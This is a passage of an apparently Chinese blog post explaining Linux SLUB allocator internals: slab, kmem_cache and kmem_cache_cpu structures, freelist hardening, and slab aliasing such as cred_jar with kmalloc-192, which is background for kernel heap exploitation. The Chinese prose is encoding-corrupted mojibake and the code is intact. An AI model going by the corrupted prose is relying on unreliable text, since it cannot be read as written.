åå†è¿”è¿˜ç»™ä¸Šå±‚è°ƒç”¨è€…ï¼Œ<strong>å•æ¬¡å‘ buddy system æ‰€è¯·æ±‚çš„ä¸€ä»½è¿ç»­å†…å­˜é¡µä¾¿ç§°ä¹‹ä¸ºä¸€å¼  slab</strong>ï¼Œåœ¨å†…æ ¸ä¸­å¯¹åº” <code>slab</code> ç»“æ„ä½“ï¼Œ<strong>æœ¬è´¨ä¸Šæ˜¯å¤ç”¨ page ç»“æ„ä½“</strong>ï¼š</p><blockquote><p>è¿™é‡Œæˆ‘ä»¬ä»…å…³æ³¨ slubï¼Œæ‰€ä»¥ç¬”è€…ä»…æˆªå– slub æ‰€éœ€å­—æ®µ</p><blockquote><p>è€ç‰ˆæœ¬ä¸­ slab æ˜¯ç›´æ¥å†…åµŒåœ¨ page ç»“æ„ä½“ä¸­çš„</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Reuses the bits in struct page */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> __page_flags;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">elif</span> defined(CONFIG_SLUB)</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">slab_cache</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">slab_list</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">int</span> slabs;<span class="hljs-comment">/* å‰©ä½™çš„ slabs æ•°é‡ */</span><br>&#125;;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br><span class="hljs-comment">/* Double-word boundary */</span><br><span class="hljs-type">void</span> *freelist;<span class="hljs-comment">/* ç¬¬ä¸€ä¸ªç©ºé—²å¯¹è±¡ */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">unsigned</span> inuse:<span class="hljs-number">16</span>;<br><span class="hljs-type">unsigned</span> objects:<span class="hljs-number">15</span>;<br><span class="hljs-type">unsigned</span> frozen:<span class="hljs-number">1</span>;<br>&#125;;<br>&#125;;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span> <span class="hljs-title">rcu_head</span>;</span><br>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> __unused;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">atomic_t</span> __page_refcount;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMCG</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> memcg_data;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>slab_cache</code> ï¼šè¯¥ slab å¯¹åº”çš„å†…å­˜æ± </li><li><code>freelist</code> ï¼š<strong>Slab ä¸Šçš„ç©ºé—²å¯¹è±¡ç»„ç»‡ä¸ºä¸€ä¸ª NULL ç»“å°¾çš„å•å‘é“¾è¡¨</strong>ï¼Œè¯¥æŒ‡é’ˆæŒ‡å‘ç¬¬ä¸€ä¸ªç©ºé—²å¯¹è±¡ï¼Œè€—å°½æ—¶ä¸º NULL</li><li><code>slab_list</code> ï¼šæŒ‰ç”¨é€”è¿æ¥å¤šä¸ª slabs çš„åŒå‘é“¾è¡¨</li><li><code>inuse</code> ï¼šå·²è¢«ä½¿ç”¨çš„å¯¹è±¡æ•°é‡</li><li><code>objects</code>ï¼šè¯¥ slab ä¸Šçš„å¯¹è±¡æ€»æ•°</li><li><code>frozen</code>ï¼šæ˜¯å¦è¢«å†»ç»“ï¼Œå³<strong>å·²ç»å½’å±äºç‰¹å®šçš„ CPU</strong></li></ul><blockquote><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯ <strong>counters æˆå‘˜ç›´æ¥æ¶µç›–äº† inuse &amp; objects &amp; frozen</strong>ï¼Œåé¢ä¼šæœ‰å¤§é‡çš„ç›´æ¥é€šè¿‡ counters æˆå‘˜è¿›è¡Œèµ‹å€¼çš„æ“ä½œï¼Œ<strong>å®é™…ä¸Šå°±æ˜¯èµ‹å€¼äº† inuse &amp; objects &amp; frozen</strong></p></blockquote><p>æ­£å¦‚ä¸€ä¸ª page ç»“æ„ä½“ç›´æ¥å¯¹åº”ä¸€å¼ å†…å­˜é¡µï¼ˆæˆ–å¤åˆé¡µï¼‰ï¼Œå¤ç”¨äº† page ç»“æ„ä½“çš„ slab ä¹Ÿ<strong>ç›´æ¥å¯¹åº”ä¸€ä»½ slab å†…å­˜é¡µ</strong>ï¼Œå€ŸåŠ© <code>page_to_pfn()</code> ç­‰å‡½æ•°å¯ä»¥ç›´æ¥å®Œæˆ slab ç»“æ„ä½“åˆ°å¯¹åº”å†…å­˜é¡µè™šæ‹Ÿåœ°å€çš„è½¬æ¢ï¼Œåä¹‹äº¦ç„¶ï¼Œå³<strong>æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ä¸€ä¸ªç©ºé—²å¯¹è±¡çš„è™šæ‹Ÿåœ°å€æ‰¾åˆ°å¯¹åº”çš„ slab ç»“æ„ä½“</strong></p><p><img src="https://s2.loli.net/2023/02/21/cBXCGF4Z18VLMzl.png" alt="image.png"></p><h2 id="äºŒã€kmem-cacheï¼šç‰¹å®šå¤§å°-ç”¨é€”å¯¹è±¡ï¼ˆå †å—ï¼‰çš„å†…å­˜æ± ">äºŒã€kmem_cacheï¼šç‰¹å®šå¤§å°&amp;ç”¨é€”å¯¹è±¡ï¼ˆå †å—ï¼‰çš„å†…å­˜æ± </h2><p><code>kmem_cache</code> ä¸ºä¸€ä¸ªåŸºæœ¬çš„ allocator ç»„ä»¶ï¼Œå¯ä»¥ç†è§£ä¸º <strong>ç”¨äºåˆ†é…æŸä¸ªç‰¹å®šå¤§å°ï¼ˆæŸç§ç‰¹å®šç”¨é€”ï¼‰çš„å¯¹è±¡çš„å†…å­˜æ± </strong>ï¼Œæ‰€æœ‰çš„ kmem_cache æ„æˆä¸€ä¸ªåŒå‘é“¾è¡¨ï¼Œå¹¶å­˜åœ¨ä¸€ä¸ªå¯¹åº”çš„é€šç”¨ <code>kmem_cache</code> æ•°ç»„ <code>kmalloc_caches</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *</span><br><span class="hljs-class"><span class="hljs-title">kmalloc_caches</span>[<span class="hljs-title">NR_KMALLOC_TYPES</span>][<span class="hljs-title">KMALLOC_SHIFT_HIGH</span> + 1] __<span class="hljs-title">ro_after_init</span> =</span><br>&#123; <span class="hljs-comment">/* initialization for https://bugs.llvm.org/show_bug.cgi?id=42570 */</span> &#125;;<br>EXPORT_SYMBOL(kmalloc_caches);<br></code></pre></td></tr></table></figure><blockquote><p>è€ç‰ˆæœ¬è¿˜æœ‰ä¸ª dma ä¸“ç”¨æ•°ç»„ <code>kmalloc_dma_caches</code> ï¼Œåœ¨ <a href="https://patchwork.kernel.org/project/linux-mm/patch/20180718133620.6205-2-vbabka@suse.cz/">è¿™ä¸ª commit</a> ç»™åˆå¹¶èµ·æ¥äº†</p></blockquote><h3 id="I-åŸºæœ¬ç»“æ„">I. åŸºæœ¬ç»“æ„</h3><p>è¯¥ç»“æ„ä½“å®šä¹‰äº <code>include/linux/slub_def.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Slab ç¼“å­˜ç®¡ç†.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_SLUB_TINY</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> __<span class="hljs-title">percpu</span> *<span class="hljs-title">cpu_slab</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">/* ç”¨äºå–å› partial slabs ç­‰. */</span><br><span class="hljs-type">slab_flags_t</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> min_partial;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;<span class="hljs-comment">/* ä¸€ä¸ªå¯¹è±¡åŒ…å«å…ƒæ•°æ®çš„å¤§å° */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> object_size;<span class="hljs-comment">/* ä¸€ä¸ªå¯¹è±¡ä¸åŒ…å«å…ƒæ•°æ®çš„å¤§å° */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">reciprocal_value</span> <span class="hljs-title">reciprocal_size</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset;<span class="hljs-comment">/* ç©ºé—²æŒ‡é’ˆçš„åç§» */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span><br><span class="hljs-comment">/* è¦ä¿ç•™çš„ per cpu partial å¯¹è±¡æ•°é‡ */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cpu_partial;<br><span class="hljs-comment">/* è¦ä¿ç•™çš„ per cpu partial slub æ•°é‡ */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cpu_partial_slabs;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">oo</span>;</span><br><br><span class="hljs-comment">/* åˆ†é…ä¸é‡Šæ”¾ slabs */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">min</span>;</span><br><span class="hljs-type">gfp_t</span> allocflags;<span class="hljs-comment">/* ï¼ˆè¯‘æ³¨ï¼šå‘ buddy systemï¼‰åˆ†é…æ—¶æ‰€ç”¨çš„ gfp æ ‡å¿—ä½ */</span><br><span class="hljs-type">int</span> refcount;<span class="hljs-comment">/* ç”¨äº slab ç¼“å­˜é”€æ¯çš„å¼•ç”¨è®¡æ•° */</span><br><span class="hljs-type">void</span> (*ctor)(<span class="hljs-type">void</span> *);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> inuse;<span class="hljs-comment">/* å…ƒæ•°æ®çš„åç§» */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> align;<span class="hljs-comment">/* å¯¹é½ */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> red_left_pad;<span class="hljs-comment">/* Left redzone padding size */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<span class="hljs-comment">/* Name (only for display!) */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><span class="hljs-comment">/* slab ç¼“å­˜é“¾è¡¨ */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SYSFS</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kobject</span> <span class="hljs-title">kobj</span>;</span><span class="hljs-comment">/* For sysfs */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> random;<span class="hljs-comment">// ç”¨äºåŠ å¯† freelist æŒ‡é’ˆçš„éšæœºå€¼</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NUMA</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * é€šè¿‡ä»ä¸€ä¸ª remote node åˆ†é…ä»¥å»ç¢ç‰‡åŒ–.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> remote_node_defrag_ratio;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *random_seq;<span class="hljs-comment">// ç”¨äºåœ¨åˆå§‹åŒ–æ—¶éšæœºåŒ– freelist</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KASAN</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kasan_cache</span> <span class="hljs-title">kasan_info</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_HARDENED_USERCOPY</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> useroffset;<span class="hljs-comment">/* ç”¨æˆ·æ‹·è´åŒºåŸŸçš„åç§» */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> usersize;<span class="hljs-comment">/* ç”¨æˆ·æ‹·è´åŒºåŸŸçš„å¤§å° */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">node</span>[<span class="hljs-title">MAX_NUMNODES</span>];</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><p><code>cpu_slab</code>ï¼š <em>percpu å˜é‡</em> ï¼ŒæŒ‡å‘ä¸€ä¸ª <code>kmem_cache_cpu</code> ç»“æ„ä½“ï¼Œå³<strong>å½“å‰ CPU ç‹¬å çš„å†…å­˜æ± </strong></p></li><li><p><code>flags</code>ï¼šæ ‡å¿—ä½</p></li><li><p><code>min_partial</code>ï¼šnode partial é“¾è¡¨ä¸Š slab çš„<strong>æœ€å¤§æ•°é‡</strong>ï¼ˆğŸ‘´ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆè¦å«minï¼Œä½†å®é™…åˆ¤å®šå‘æŒ¥çš„æ˜¯maxçš„ä½œç”¨ï¼‰</p></li><li><p><code>size</code>ï¼šä¸€ä¸ªå¯¹è±¡çš„å®é™…å¤§å°</p></li><li><p><code>object_size</code>ï¼šä¸€ä¸ªå¯¹è±¡æ‰€ç”¨æ•°æ®çš„å¤§å°</p><blockquote><p>ä¾‹å¦‚ <code>struct cred</code> å¤§å°ä¸º 176ï¼ˆobject_sizeï¼‰ï¼Œå®é™…åˆ†é…çš„å¯¹è±¡å¤§å°ä¸º 192 ï¼ˆsizeï¼‰</p></blockquote></li><li><p><code>offset</code>ï¼šslab ä¸Šç©ºé—²å¯¹è±¡é“¾è¡¨æŒ‡é’ˆåœ¨å¯¹è±¡ä¸Šçš„åç§»</p></li><li><p><code>oo</code> ï¼š <em>å…¶å®å°±æ˜¯ä¸€ä¸ª int</em></p><ul><li>ä½ 16 ä½ï¼šä¸€å¼  slab ä¸Šçš„å¯¹è±¡æ•°é‡</li><li>é«˜ 16 ä½ï¼šä¸€å¼  slab çš„å¤§å°ï¼ˆ2<sup>n</sup> å¼ å†…å­˜é¡µï¼‰</li></ul></li><li><p><code>min</code>ï¼šä¸€å¼  slab ä¸Šæœ€å°‘çš„å¯¹è±¡æ•°é‡</p></li><li><p><code>allocflags</code>ï¼šå‘ buddy system è¯·æ±‚é¡µé¢æ—¶æ‰€ç”¨çš„ gfp flag</p></li><li><p><code>ctor</code>ï¼šå¯¹è±¡çš„æ„é€ å‡½æ•°ï¼Œåœ¨åˆ†é…å¯¹è±¡åä¼šè°ƒç”¨è¯¥å‡½æ•°è¿›è¡Œåˆå§‹åŒ–</p></li><li><p><code>inuse</code>ï¼šå®é™…ä¸Šå°±æ˜¯ <code>object_size</code></p></li><li><p><code>align</code>ï¼šå¯¹è±¡å¯¹é½çš„å®½åº¦</p></li><li><p>Randomed freelist ä¿æŠ¤ç›¸å…³ï¼š</p><ul><li><code>random_seq</code> ï¼šç”¨äºåœ¨ slab åˆå§‹åŒ–æ—¶éšæœºåŒ– freelist ä¸Šç©ºé—²å¯¹è±¡çš„è¿æ¥é¡ºåº</li></ul></li><li><p>Hardened Usercopy ä¿æŠ¤ç›¸å…³</p><ul><li><code>useroffset</code>ï¼šç”¨æˆ·ç©ºé—´èƒ½è¯»å†™åŒºåŸŸçš„èµ·å§‹åç§»</li><li><code>usersize</code>ï¼šç”¨æˆ·ç©ºé—´èƒ½è¯»å†™åŒºåŸŸçš„å¤§å°</li></ul></li><li><p><code>node</code>ï¼šä¸€ä¸ª <code>kmem_cache_node</code> æ•°ç»„ï¼Œå¯¹åº”å¤šä¸ª<strong>ä¸åŒ node çš„åå¤‡å†…å­˜æ± </strong></p></li></ul><p><img src="https://s2.loli.net/2023/02/21/D4idvgzLAaqIBQM.png" alt="image.png"></p><h3 id="II-ç±»å‹">II. ç±»å‹</h3><p>åˆå§‹æ—¶ä¸€å…±æœ‰å¦‚ä¸‹å‡ ç§ç±»å‹çš„ <code>kmem_cache</code>ï¼Œåœ¨è¿›è¡Œå†…å­˜åˆ†é…æ—¶è‹¥æœªæŒ‡å®šå†…å­˜æ± åˆ™ä¼šæ ¹æ®å¯¹åº”çš„ flag ä»ä¸åŒçš„ <code>kmem_cache</code> ä¸­å–ï¼š</p><ul><li><code>KMALLOC_NORMAL</code> ï¼šé€šç”¨ç±»å‹å†…å­˜æ± ï¼Œå¯¹åº” <code>kmalloc-*</code>ï¼Œå¯¹åº”åˆ†é… flag ä¸º <code>GFP_KERNEL</code></li><li><code>KMALLOC_DMA</code>ï¼šç”¨äº DMA çš„å†…å­˜æ± ï¼Œå¯¹åº” <code>kmalloc-dma-*</code></li><li><code>KMALLOC_RECLAIM</code> å¯ä»¥è¢«å›æ”¶çš„å†…å­˜æ± ï¼Œå¯¹åº” <code>kmalloc-rcl-*</code></li><li><code>KMALLOC_CGROUP</code> ï¼šç”¨äºéœ€è¦è¿›è¡Œæ•°é‡ç»Ÿè®¡ï¼ˆ<code>accounted</code>ï¼Œä¸»è¦ç”¨äº CGROUP ç›¸å…³ï¼‰çš„å†…å­˜æ± ï¼Œå¯¹åº” <code>kmalloc-cg-*</code> ï¼Œå¯¹åº”åˆ†é… flag ä¸º <code>GFP_KERNEL_ACCOUNT</code></li></ul><p>è‹¥æ˜¯æœªå¼€å¯å¯¹åº”çš„ç¼–è¯‘é€‰é¡¹ï¼Œåˆ™é»˜è®¤åˆå¹¶å…¥ <code>KMALLOC_NORMAL</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Whenever changing this, take care of that kmalloc_type() and</span><br><span class="hljs-comment"> * create_kmalloc_caches() still work as intended.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * KMALLOC_NORMAL can contain only unaccounted objects whereas KMALLOC_CGROUP</span><br><span class="hljs-comment"> * is for accounted but unreclaimable and non-dma objects. All the other</span><br><span class="hljs-comment"> * kmem caches can have both accounted and unaccounted objects.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">kmalloc_cache_type</span> &#123;</span><br>KMALLOC_NORMAL = <span class="hljs-number">0</span>,<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_ZONE_DMA</span><br>KMALLOC_DMA = KMALLOC_NORMAL,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_MEMCG_KMEM</span><br>KMALLOC_CGROUP = KMALLOC_NORMAL,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_TINY</span><br>KMALLOC_RECLAIM = KMALLOC_NORMAL,<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>KMALLOC_RECLAIM,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ZONE_DMA</span><br>KMALLOC_DMA,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMCG_KMEM</span><br>KMALLOC_CGROUP,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>NR_KMALLOC_TYPES<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="III-slab-aliasï¼ˆmergeabilityï¼‰">III. slab aliasï¼ˆmergeabilityï¼‰</h3><p>slab alias æœºåˆ¶æ˜¯ä¸€ç§å¯¹åŒç­‰/ç›¸è¿‘å¤§å° object çš„ <code>kmem_cache</code> è¿›è¡Œ<strong>å¤ç”¨</strong>çš„ä¸€ç§æœºåˆ¶ï¼š</p><ul><li>å½“ä¸€ä¸ª <code>kmem_cache</code> åœ¨åˆ›å»ºæ—¶ï¼Œè‹¥å·²ç»å­˜åœ¨èƒ½åˆ†é…ç›¸ç­‰/è¿‘ä¼¼å¤§å°çš„ object çš„ <code>kmem_cache</code> ï¼Œåˆ™<strong>ä¸ä¼šåˆ›å»ºæ–°çš„ kmem_cacheï¼Œè€Œæ˜¯ä¸ºåŸæœ‰çš„ kmem_cache èµ·ä¸€ä¸ª aliasï¼Œä½œä¸ºâ€œæ–°çš„â€ kmem_cache è¿”å›</strong></li></ul><blockquote><p>ä¸¾ä¸ªğŸŒ°ï¼Œ<code>cred_jar</code> æ˜¯ä¸“é—¨ç”¨ä»¥åˆ†é… <code>cred</code> ç»“æ„ä½“çš„ <code>kmem_cache</code>ï¼Œåœ¨ Linux 4.4 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œå…¶ä¸º <code>kmalloc-192</code> çš„ aliasï¼Œå³ cred ç»“æ„ä½“ä¸å…¶ä»–çš„ 192 å¤§å°çš„ object éƒ½ä¼šä»åŒä¸€ä¸ª <code>kmem_cache</code>â€”â€”<code>kmalloc-192</code> ä¸­åˆ†é…</p></blockquote><p>å¯¹äºåˆå§‹åŒ–æ—¶è®¾ç½®äº† <code>SLAB_ACCOUNT</code> è¿™ä¸€ flag çš„ <code>kmem_cache</code> è€Œè¨€ï¼Œåˆ™ä¼šæ–°å»ºä¸€ä¸ªæ–°çš„ <code>kmem_cache</code> è€Œéä¸ºåŸæœ‰çš„å»ºç«‹ aliasï¼ŒğŸŒ°å¦‚åœ¨æ–°ç‰ˆçš„å†…æ ¸å½“ä¸­ <code>cred_jar</code> ä¸ <code>kmalloc-192</code> ä¾¿æ˜¯ä¸¤ä¸ªç‹¬ç«‹çš„ <code>kmem_cache</code>ï¼Œ<strong>å½¼æ­¤ä¹‹é—´äº’ä¸å¹²æ‰°</strong></p><h2 id="ä¸‰ã€kmem-cache-cpuï¼šå„-CPU-ç‹¬å å†…å­˜æ± ">ä¸‰ã€kmem_cache_cpuï¼šå„ CPU ç‹¬å å†…å­˜æ± </h2><p>å½“è¿›ç¨‹å‘ slab allocator è¯·æ±‚å†…å­˜åˆ†é…æ—¶ï¼Œé¦–å…ˆä¼šå°è¯•ä»å½“å‰ CPU çš„ç‹¬å å†…å­˜æ± è¿›è¡Œåˆ†é… â€”â€”<code>kmem_cache_cpu</code> ç»“æ„ä½“è¡¨ç¤º<strong>æ¯ä¸ª CPU ç‹¬å çš„å†…å­˜æ± </strong>ï¼Œå…¶åœ¨ <code>kmem_cache</code> ä¸­ä¸ºä¸€ä¸ª percpu å˜é‡ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * When changing the layout, make sure freelist and tid are still compatible</span><br><span class="hljs-comment"> * with this_cpu_cmpxchg_double() alignment requirements.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> &#123;</span><br><span class="hljs-type">void</span> **freelist;<span class="hljs-comment">/* æŒ‡å‘ä¸‹ä¸€ä¸ªå¯ç”¨å¯¹è±¡çš„æŒ‡é’ˆ */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tid;<span class="hljs-comment">/* Globally unique transaction id */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><span class="hljs-comment">/* ç”¨ä»¥å†…å­˜åˆ†é…çš„ slab */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">partial</span>;</span><span class="hljs-comment">/* Partially allocated frozen slabs */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">local_lock_t</span> lock;<span class="hljs-comment">/* Protects the fields above */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_STATS</span><br><span class="hljs-type">unsigned</span> stat[NR_SLUB_STAT_ITEMS];<br><span class="hljs-meta">#<span 